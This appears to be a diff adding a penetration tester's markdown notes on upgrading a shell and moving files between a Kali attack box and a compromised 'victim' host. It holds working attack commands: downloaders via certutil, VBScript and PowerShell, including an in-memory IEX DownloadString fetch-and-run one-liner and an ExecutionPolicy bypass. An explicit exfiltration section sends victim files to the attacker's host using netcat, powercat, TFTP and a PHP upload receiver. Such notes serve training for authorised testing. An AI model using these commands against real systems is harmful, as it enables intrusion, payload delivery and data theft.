@@ -1,0 +1,251 @@
+# Upgrading a non-interactive shell
+
+## Python
+Most common method on Linux hosts, as there is usually a python interpreter installed.
+````
+python -c 'import pty;pty.spawn("/bin/bash")'
+````
+
+
+# File transfers 
+
+## Downloads (from Kali to the victim)
+
+### Linux targets
+
+
+#### Netcat
+Can transfer files in both text and binary. On the target:
+````
+nc -nlvp 4444 > incoming.txt
+````
+On Kali:
+````
+sudo nc -nv <target IP> 4444 < <path to file>
+`````
+
+
+#### FTP
+Install Pure-FTPd on Kali (sudo apt update && sudo apt install pure-ftpd).
+Create a new user for Pure-FTPd (check how to on the net)
+
+#### HTTP
+Start a web server on Kali and download the file from the compromised machine
+
+#### Socat
+...
+
+#### netcat
+
+#### curl, wget
+
+
+### Windows targets
+
+#### Netcat
+Can transfer files in both text and binary. On Windows:
+````
+nc -nlvp 4444 > incoming.exe
+````
+On Kali:
+````
+sudo nc -nv <Windows IP> 4444 < <path to file>
+`````
+
+#### FTP
+We can use the FTP -s flag, which allows us to specify a text file containing FTP commands that will be executed automatically when FTP starts.
+- Set up an FTP server on Kali 
+- Place the file to transfer (in this example _nc.exe_) in /ftphome directory.
+- On Windows, create a _ftp.txt_ file containing the commands to execute (transfer the file in binary mode):
+  ````
+  echo open <Kali IP> 21> ftp.txt
+  echo USER <FTP username>>> ftp.txt
+  echo <FTP password>>> ftp.txt
+  echo bin >> ftp.txt
+  echo GET nc.exe >> ftp.txt
+  echo bye >> ftp.txt
+  `````
+- Download the file from Windows: 
+  ```
+  ftp -v -n -s:ftp.txt
+  ````
+  -v to suppress any returned output, -n to suppress automatic login, -s to specify the file
+  
+#### VBScript
+We can issue the following commands into a remote shell to write out a _wget.vbs_ script that acts as a HTTP downloader:
+`````
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wge
+t.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.
+vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET", strURL, False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+``````
+We can then run this script from Windows to download a file on Kali:
+````
+cscript wget.vbs http://<Kali IP>/<File to download> <Name of the downloaded file>
+`````
+
+
+#### Powershell
+Create a Powershell downloader script on the Windows machine:
+````
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://<Kali IP>/<File to download>" >>wget.ps1
+echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+`````
+Run this script on Windows:
+````
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+````
+The execution of ppowershell scripts is restricted by default, so we allow it with _-ExecutionPolicy Bypass_.
+
+Alternative one-liners:
+````
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<Kali IP>/<File to download>', '<Name of the downloaded file>')
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<Kali IP>/<File to download>','C:\<Path of the downloaded file>')"
+````
+
+Download without saving the file to disk:
+````
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://<Kali IP>/<File to download>')
+````
+
+
+#### Exe2hex and Powershell
+Example to transfer nc.exe from Kali to Windows by executing the following steps:
+- Compress the file with _upx_:
+````
+upx -9 nc.exe
+````
+- Convert the file to a Windows script (_.cmd_) with _exe2hex_:
+```
+exe2hex -x nc.exe -p nc.cmd
+````
+
+- Copy the script (we can copy it to the clipboard with _cat nc.cmd | xclip -selection clipboard_)
+
+- Paste the script in the remote shell. This will automatically transfer the hex file on Windows and convert it back to binary (at the end of the script, there are commands which rebuild the _nc.exe_ executable on the target).
+
+
+
+#### Certutil
+Download a file from the internet:
+````
+certutil.exe -urlcache -split -f http://<Kali IP>/<File to download> <Name of the downloaded file>
+certutil.exe -verifyctl -f -split http://<Kali IP>/<File to download> <Name of the downloaded file>
+`````
+
+
+
+
+
+
+## Uploads (from the victim to Kali)
+
+Used to exfiltrate data.
+
+### Windows targets
+
+#### Netcat
+Can transfer files in both text and binary. On Kali:
+````
+nc -nlvp 4444 > incoming.txt
+````
+On Windows:
+````
+nc -nv <Kali IP> 4444 < <path to file>
+`````
+
+#### PowerShell
+
+Complex because standard TFTP, FTP, and HTTP servers are rarely enabled on Windows by default. 
+If outbound HTTP traffic is allowed, we can use the _System.Net.WebClient_ Powershell class.
+
+Create the following PHP script on Kali and save it as _upload.php_ in the webroot directory (_/var/www/html_):
+
+````
+<?php
+$uploaddir = '/var/www/uploads/';
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+````
+
+This code processes an incoming file upload request (POST) and save the transferred data to _/var/www/uploads/_. 
+Before using it, we create the _uploads_ folder and grant the _www_data_ user ownership and write permissions (check status as well):
+
+````
+sudo mkdir /var/www/uploads
+ps -ef | grep apache
+sudo chown www-data: /var/www/uploads
+ls -al
+````
+Warning: this allows anyone interacting with _uploads.php_ to upload files on Kali.
+
+Finally, from Windows, invoke the _UploadFile_ method from the _System.Net.WebClient_ class to upload the document we want to exfiltrate:
+
+````
+powershell (New-Object System.Net.WebClient).UploadFile('http://<Kali IP>/upload.php', '<Doc to exfil')
+`````
+
+#### Powercat
+
+On Kali:
+````
+sudo nc -nlvp 443 > <name of the object that will be received>
+````
+On Windows:
+````
+powercat -c <Kali IP> -p 443 -i C:\<path of the object to transfer>
+````
+In this command, _-c_ specifies the client mode and sets the listening address, _-i_ indicates the local file to transfer.
+
+
+#### TFTP 
+
+TFTP is a UDP-based file transfer protocol.
+Rarely works (often restricted by egress firewall rules), but can come handy in certain situation. 
+For example, it can be used on older systems if PowerShell isn't installed.
+
+- Install and configure a TFTP server on Kali:
+  ````
+  sudo apt update && sudo apt install atftp
+  sudo mkdir /tftp
+  sudo chown nobody: /tftp
+  sudo atftpd --daemon --port 69 /tftp
+  ````
+- On Windows, run the TFTP client with _-i_ to specify a binary image transfer:
+  ````
+  tftp -i <Kali IP> put <Doc to exfil>
+  ````
+
+
+
+
+
+
+
+
